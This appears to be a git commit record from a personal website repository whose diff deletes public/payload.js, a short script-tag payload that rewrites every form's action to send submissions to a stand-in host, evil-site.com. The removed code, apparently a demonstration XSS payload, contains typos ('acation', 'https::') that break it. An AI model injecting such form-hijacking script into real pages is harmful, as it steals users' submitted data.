dc2b1a73913a3c5a80955c468090ea5abfaac079
GouveaHeitor <hi@heitorgouvea.me>
2020-02-01 21:36:43 -0300

    update resume

--- public/payload.js
+++
@@ -1,7 +0,0 @@
-<script>
-    for (i = 0; i < document.forms.length; i++) {
-        var originalFormAction = document.forms[i].action;
-
-        document.forms[i].acation = "https:://evil-site.com/catcher.php=orig=" + originalFormAction
-    }
-</script>
